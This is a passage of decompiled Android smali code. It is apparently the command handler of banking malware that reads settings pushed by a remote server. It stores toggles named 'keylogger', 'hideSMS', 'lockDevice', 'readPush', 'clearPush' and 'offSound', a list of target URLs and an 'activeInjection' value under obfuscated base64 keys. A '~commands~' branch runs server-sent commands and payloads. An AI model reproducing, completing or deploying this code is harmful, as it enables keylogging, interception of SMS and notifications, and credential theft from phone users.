    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 3
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 4
    new-instance p1, Lorg/json/JSONObject;

    const-string p2, "settings"

    invoke-virtual {v0, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-direct {p1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, ""

    :try_start_0
    new-instance p3, Lorg/json/JSONArray;

    const-string v1, "arrayUrl"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p3, v1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x0

    invoke-virtual {p3}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lez v2, :cond_3

    :goto_0
    add-int/lit8 v3, v1, 0x1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, v1}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ";"

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-lt v3, v2, :cond_2

    goto :goto_1

    :cond_2
    move v1, v3

    goto :goto_0

    :catchall_0
    move-exception p3

    invoke-static {p3}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_3
    :goto_1
    const-string p3, "value"

    .line 5
    invoke-static {p2, p3}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p3

    const-string v1, "urls"

    invoke-interface {p3, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 6
    const-string p2, "lockDevice"

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "settings.getString(vucu.\u2026xQYytLQkYzdVA4cTBnPT0=\"))"

    invoke-static {p2, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 7
    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p3

    const-string v1, "lockDevice"

    invoke-interface {p3, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 8
    const-string p2, "hideSMS"

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "settings.getString(vucu.\u2026NCU2U4OElYdWl5M0F3PT0=\"))"

    invoke-static {p2, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 9
    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p3

    const-string v1, "hiddenSMS"

    invoke-interface {p3, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 10
    const-string p2, "offSound"

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "settings.getString(vucu.\u2026lxQUFEZHBmY0p4TjJ3PT0=\"))"

    invoke-static {p2, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 11
    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p3

    const-string v1, "offSound"

    invoke-interface {p3, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 12
    const-string p2, "keylogger"

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "settings.getString(vucu.\u2026MvTXpPdGs1RmMyRFpnPT0=\"))"

    invoke-static {p2, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 13
    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p3

    const-string v1, "keylogger"

    invoke-interface {p3, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 14
    const-string p2, "clearPush"

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "settings.getString(vucu.\u2026FERzYxTVc3bVAraHhBPT0=\"))"

    invoke-static {p2, p3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 15
    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p3

    const-string v1, "clearPush"

    invoke-interface {p3, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 16
    const-string p2, "readPush"

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string p2, "settings.getString(vucu.\u2026hUbTNadEpUMWIxZ0hBPT0=\"))"

    invoke-static {p1, p2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 17
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p2

    const-string p3, "readPush"

    invoke-interface {p2, p3, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 18
    const-string p1, "activeInjection"

    invoke-virtual {v0, p1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string p2, "jsonObject.getString(vuc\u2026RyRTFBODFpVUYzNmhnPT0=\"))"

    invoke-static {p1, p2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 19
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p2

    const-string p3, "VDU4Yk9kbXMrUDNCOUVHU0lYTGs1UT09Ojo5QlIySzdZRFFmU2lVdFlxVEFoejhBPT0="

    invoke-static {p3, p2, p1}, Lc0/a;->a(Ljava/lang/String;Landroid/content/SharedPreferences$Editor;Ljava/lang/String;)V

    goto :goto_3

    .line 20
    :cond_4
    const-string p3, "~commands~"

    invoke-static {p2, p3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_6

    const-string p2, "get ~commands~: "

    invoke-static {p2, v0}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 21
    sget-object p2, Lb0/b;->a:Lb0/b;

    .line 22
    const-string p2, "data"

    invoke-virtual {v0, p2}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object p2

    :try_start_1
    const-string p3, "payload"

    invoke-virtual {p2, p3}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object p3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    goto :goto_2

    :catchall_1
    move-exception p3

    invoke-static {p3}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object p3

    .line 23
    :goto_2
    instance-of v0, p3, Lj0/d$a;

    if-eqz v0, :cond_5

    const/4 p3, 0x0

    .line 24
    :cond_5
    check-cast p3, Lorg/json/JSONObject;

    const-string v0, "command"

    invoke-virtual {p2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string v0, "command"

    invoke-static {p2, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, p1, p3, p2}, Lh0/b;->d(Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)V

    :cond_6
    :goto_3
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method
